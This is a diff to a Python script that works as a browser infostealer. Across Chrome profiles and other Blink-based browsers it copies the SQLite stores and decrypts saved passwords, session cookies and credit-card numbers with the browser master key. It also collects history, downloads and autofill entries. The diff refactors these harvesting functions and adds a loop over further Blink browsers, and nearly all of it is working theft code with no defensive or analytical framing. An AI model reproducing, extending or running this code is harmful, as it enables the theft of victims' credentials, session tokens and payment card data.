@@ -59,12 +59,13 @@ def decrypt_password(buff, master_key):
         return "Chrome < 80"    
 
 
-def get_login_data(path, master_key):
+def get_login_data(path, master_key, blink = False):
         try:
             global logins
-            num = path.rfind("\\")
-            profile = path[num+1:]
-            logins += f"===============================\n\n\n{profile}:\n\n"
+            if not blink:
+                num = path.rfind("\\")
+                profile = path[num+1:]
+                logins += f"===============================\n\n\n{profile}:\n\n"
             login_db = f'{path}\\Login Data'
             copy2(login_db, os.environ['USERPROFILE'] + '\\AppData\\Roaming\\Loginvault.db') 
             conn = connect(os.environ['USERPROFILE'] + '\\AppData\\Roaming\\Loginvault.db')
@@ -94,12 +95,13 @@ def time(date):
     except:
         return "Can't decode"
 
-def get_web_history(path):
+def get_web_history(path, blink = False):
     try:
         global history
-        num = path.rfind("\\")
-        profile = path[num+1:]
-        history += f"===============================\n\n\n{profile}:\n\n"
+        if not blink:
+            num = path.rfind("\\")
+            profile = path[num+1:]
+            history += f"===============================\n\n\n{profile}:\n\n"
         HistorySQL = "SELECT url FROM visits"
         HistoryLinksSQL = "SELECT url, title, last_visit_time FROM urls WHERE id=%d"
         history_db = os.path.join(path, 'history')
@@ -118,6 +120,132 @@ def get_web_history(path):
             pass
     except Exception as e:
         #Log(f"{path} history ---> {e}")
+        pass
+
+
+def get_downloads(path, blink = False):
+    try:
+        global downhistory
+        if not blink:
+            num = path.rfind("\\")
+            profile = path[num+1:]
+            downhistory += f"===============================\n\n\n{profile}:\n\n"
+        downloads_db = f'{path}\\History'
+        if not os.path.exists(downloads_db):
+            return
+        copy2(downloads_db, os.path.dirname(path)+'\\downloads_db')
+        conn = connect(os.path.dirname(path)+'\\downloads_db')
+        cursor = conn.cursor()
+        cursor.execute('SELECT tab_url, target_path FROM downloads')
+        for row in cursor.fetchall():
+            if not row[0] or not row[1]:
+                continue
+            downhistory += f"""
+Download URL: {row[0]}
+Local Path: {row[1]}
+"""
+        conn.close()
+        try:
+            os.remove(os.path.dirname(path)+'\\downloads_db')
+        except:
+            pass
+    except Exception as e:
+        #Log(f"{path} downhistory ---> {e}")
+        pass
+
+def get_cookies(path, master_key, blink = False):
+    try:
+        global cookies
+        if not blink:
+            num = path.rfind("\\")
+            profile = path[num+1:]
+            cookies += f"===============================\n\n\n{profile}:\n\n"
+        cookie_db = path + '\\Network\\Cookies'
+        if not os.path.exists(cookie_db):
+            return None
+        copy2(cookie_db, os.path.dirname(path)+'\\cookie_db')
+        conn = connect(os.path.dirname(path)+'\\cookie_db')
+        cursor = conn.cursor()
+        cursor.execute("SELECT host_key, path, datetime(expires_utc/1000000,'unixepoch') as expires_utc, name, encrypted_value FROM cookies")
+        for row in cursor.fetchall():
+            if not all(row[:4]):
+                continue
+
+            cookie_value = decrypt_password(row[4], master_key)
+            cookie_line = f"{row[0]}\tTRUE\t{row[2]}\tFALSE\t{row[4]}\t{row[1]}\t{cookie_value}"
+            cookies += cookie_line + "\n\n"
+        conn.close()
+        try:
+            os.remove(os.path.dirname(path)+'\\cookie_db')
+        except:
+            pass
+    except Exception as e:
+        #Log(f"{path} cookies ---> {e}")
+        pass
+
+def get_autofils(path, blink = False):
+    try:
+        global autofills
+        if not blink:
+            num = path.rfind("\\")
+            profile = path[num+1:]
+            autofills += f"===============================\n\n\n{profile}:\n\n"
+        webdata = f'{path}\\Web Data'
+        if not os.path.exists(webdata):
+            return
+        copy2(webdata, os.path.dirname(path)+'\\Web Data')
+        conn = connect(os.path.dirname(path)+'\\Web Data')
+        cursor = conn.cursor()
+        cursor.execute('SELECT name, value FROM autofill')
+        for row in cursor.fetchall():
+            if not row[0] or not row[1]:
+                continue
+            autofills += f"""
+Name: {row[0]}
+Value: {row[1]}
+"""
+        conn.close()
+        try:
+            os.remove(os.path.dirname(path)+'\\Web Data')
+        except:
+            pass
+    except Exception as e:
+        #Log(f"{path} autofils ---> {e}")
+        pass
+
+
+def get_credit_cards(path, master_key, blink = False):
+    try:
+        global cards
+        if not blink:
+            num = path.rfind("\\")
+            profile = path[num+1:]
+            cards += f"===============================\n\n\n{profile}:\n\n"
+        cards_db = f'{path}\\Web Data'
+        if not os.path.exists(cards_db):
+            return
+        copy2(cards_db, os.path.dirname(path)+'\\cards_db')
+        conn = connect(os.path.dirname(path)+'\\cards_db')
+        cursor = conn.cursor()
+        cursor.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')
+        for row in cursor.fetchall():
+            if not row[0] or not row[1] or not row[2] or not row[3]:
+                continue
+            card_number = decrypt_password(row[3], master_key)
+            cards += f"""
+Name On Card: {row[0]}
+Card Number: {card_number}
+Expires On:  {row[1]} / {row[2]}
+Added On: {datetime.fromtimestamp(row[4])}
+"""
+        conn.close()
+        try:
+            os.remove(os.path.dirname(path)+'\\cards_db')
+        except:
+            pass
+    except Exception as e:
+        #Log(f"{path} cards ---> {e}")
+        print(e)
         pass
 
 def Write(pathToLogs, browser):
@@ -171,128 +299,6 @@ def Write(pathToLogs, browser):
         downhistory = ''''''
         cards = ''''''
         autofills = ''''''
-
-def get_downloads(path):
-    try:
-        global downhistory
-        num = path.rfind("\\")
-        profile = path[num+1:]
-        downhistory += f"===============================\n\n\n{profile}:\n\n"
-        downloads_db = f'{path}\\History'
-        if not os.path.exists(downloads_db):
-            return
-        copy2(downloads_db, os.path.dirname(path)+'\\downloads_db')
-        conn = connect(os.path.dirname(path)+'\\downloads_db')
-        cursor = conn.cursor()
-        cursor.execute('SELECT tab_url, target_path FROM downloads')
-        for row in cursor.fetchall():
-            if not row[0] or not row[1]:
-                continue
-            downhistory += f"""
-Download URL: {row[0]}
-Local Path: {row[1]}
-"""
-        conn.close()
-        try:
-            os.remove(os.path.dirname(path)+'\\downloads_db')
-        except:
-            pass
-    except Exception as e:
-        #Log(f"{path} downhistory ---> {e}")
-        pass
-
-def get_cookies(path, master_key):
-    try:
-        global cookies
-        num = path.rfind("\\")
-        profile = path[num+1:]
-        cookies += f"===============================\n\n\n{profile}:\n\n"
-        cookie_db = path + '\\Network\\Cookies'
-        if not os.path.exists(cookie_db):
-            return None
-        copy2(cookie_db, os.path.dirname(path)+'\\cookie_db')
-        conn = connect(os.path.dirname(path)+'\\cookie_db')
-        cursor = conn.cursor()
-        cursor.execute("SELECT host_key, path, datetime(expires_utc/1000000,'unixepoch') as expires_utc, name, encrypted_value FROM cookies")
-        for row in cursor.fetchall():
-            if not all(row[:4]):
-                continue
-
-            cookie_value = decrypt_password(row[4], master_key)
-            cookie_line = f"{row[0]}\tTRUE\t{row[2]}\tFALSE\t{row[4]}\t{row[1]}\t{cookie_value}"
-            cookies += cookie_line + "\n\n"
-        conn.close()
-        try:
-            os.remove(os.path.dirname(path)+'\\cookie_db')
-        except:
-            pass
-    except Exception as e:
-        #Log(f"{path} cookies ---> {e}")
-        pass
-
-def get_autofils(path):
-    try:
-        global autofills
-        num = path.rfind("\\")
-        profile = path[num+1:]
-        autofills += f"===============================\n\n\n{profile}:\n\n"
-        webdata = f'{path}\\Web Data'
-        if not os.path.exists(webdata):
-            return
-        copy2(webdata, os.path.dirname(path)+'\\Web Data')
-        conn = connect(os.path.dirname(path)+'\\Web Data')
-        cursor = conn.cursor()
-        cursor.execute('SELECT name, value FROM autofill')
-        for row in cursor.fetchall():
-            if not row[0] or not row[1]:
-                continue
-            autofills += f"""
-Name: {row[0]}
-Value: {row[1]}
-"""
-        conn.close()
-        try:
-            os.remove(os.path.dirname(path)+'\\Web Data')
-        except:
-            pass
-    except Exception as e:
-        #Log(f"{path} autofils ---> {e}")
-        pass
-
-
-def get_credit_cards(path, master_key):
-    try:
-        global cards
-        num = path.rfind("\\")
-        profile = path[num+1:]
-        cards += f"===============================\n\n\n{profile}:\n\n"
-        cards_db = f'{path}\\Web Data'
-        if not os.path.exists(cards_db):
-            return
-        copy2(cards_db, os.path.dirname(path)+'\\cards_db')
-        conn = connect(os.path.dirname(path)+'\\cards_db')
-        cursor = conn.cursor()
-        cursor.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')
-        for row in cursor.fetchall():
-            if not row[0] or not row[1] or not row[2] or not row[3]:
-                continue
-            card_number = decrypt_password(row[3], master_key)
-            cards += f"""
-Name On Card: {row[0]}
-Card Number: {card_number}
-Expires On:  {row[1]} / {row[2]}
-Added On: {datetime.fromtimestamp(row[4])}
-"""
-        conn.close()
-        try:
-            os.remove(os.path.dirname(path)+'\\cards_db')
-        except:
-            pass
-    except Exception as e:
-        #Log(f"{path} cards ---> {e}")
-        print(e)
-        pass
-
 
 def Chromium():
     global logins
@@ -351,7 +357,16 @@ def Chromium():
                     #Log(f"{profile_path} ---> {error}")
                     pass
             Write(pathToLogs, key)
-
+    
+    for key, value in blink_directory.items():
+        master_key = get_master_key(value)
+        get_login_data(value, master_key, True)
+        get_web_history(value, True)
+        get_downloads(value, True)
+        get_cookies(value, master_key, True)
+        get_credit_cards(value, master_key, True)
+        get_autofils(value, True)
+        Write(pathToLogs, key)
 
 if __name__ == "__main__":
     Chromium()
